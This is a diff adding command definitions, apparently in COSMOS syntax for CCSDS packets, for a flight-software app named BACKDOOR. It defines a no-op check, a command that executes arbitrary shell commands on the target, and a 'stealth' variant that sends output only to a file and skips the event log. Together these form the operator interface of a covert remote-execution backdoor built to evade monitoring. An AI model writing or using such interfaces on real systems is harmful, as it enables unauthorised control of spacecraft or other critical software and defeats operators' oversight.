@@ -1,0 +1,22 @@
+COMMAND BACKDOOR NOOP BIG_ENDIAN "Backdoor No-Op (confirms app is running)"
+  APPEND_ID_PARAMETER CCSDS_STREAMID 16   UINT   0x1880      0x1880     0x1880   "CCSDS Packet Identification" BIG_ENDIAN
+  APPEND_PARAMETER    CCSDS_SEQUENCE 16   UINT   0xC000      MAX_UINT16 0xC000   "CCSDS Packet Sequence Control" BIG_ENDIAN
+  APPEND_PARAMETER    CCSDS_LENGTH   16   UINT   MIN_UINT16  MAX_UINT16 1        "CCSDS Packet Data Length" BIG_ENDIAN
+  APPEND_PARAMETER    CCSDS_FC        8   UINT   MIN_UINT8   MAX_UINT8  0        "CCSDS Command Function Code"
+  APPEND_PARAMETER    CCSDS_CHECKSUM  8   UINT   MIN_UINT8   MIN_UINT8  0        "Checksum"
+
+COMMAND BACKDOOR EXEC BIG_ENDIAN "Execute shell command (output to EVS + file)"
+  APPEND_ID_PARAMETER CCSDS_STREAMID 16   UINT   0x1880      0x1880     0x1880   "CCSDS Packet Identification" BIG_ENDIAN
+  APPEND_PARAMETER    CCSDS_SEQUENCE 16   UINT   0xC000      MAX_UINT16 0xC000   "CCSDS Packet Sequence Control" BIG_ENDIAN
+  APPEND_PARAMETER    CCSDS_LENGTH   16   UINT   MIN_UINT16  MAX_UINT16 201      "CCSDS Packet Data Length" BIG_ENDIAN
+  APPEND_PARAMETER    CCSDS_FC        8   UINT   MIN_UINT8   MAX_UINT8  1        "CCSDS Command Function Code"
+  APPEND_PARAMETER    CCSDS_CHECKSUM  8   UINT   MIN_UINT8   MIN_UINT8  0        "Checksum"
+  APPEND_PARAMETER    COMMAND       1600  STRING                         "ls" "Shell command to execute"
+
+COMMAND BACKDOOR EXEC_QUIET BIG_ENDIAN "Execute shell command (output to file only, no EVS)"
+  APPEND_ID_PARAMETER CCSDS_STREAMID 16   UINT   0x1880      0x1880     0x1880   "CCSDS Packet Identification" BIG_ENDIAN
+  APPEND_PARAMETER    CCSDS_SEQUENCE 16   UINT   0xC000      MAX_UINT16 0xC000   "CCSDS Packet Sequence Control" BIG_ENDIAN
+  APPEND_PARAMETER    CCSDS_LENGTH   16   UINT   MIN_UINT16  MAX_UINT16 201      "CCSDS Packet Data Length" BIG_ENDIAN
+  APPEND_PARAMETER    CCSDS_FC        8   UINT   MIN_UINT8   MAX_UINT8  2        "CCSDS Command Function Code"
+  APPEND_PARAMETER    CCSDS_CHECKSUM  8   UINT   MIN_UINT8   MIN_UINT8  0        "Checksum"
+  APPEND_PARAMETER    COMMAND       1600  STRING                         "ls" "Shell command to execute (stealth)"
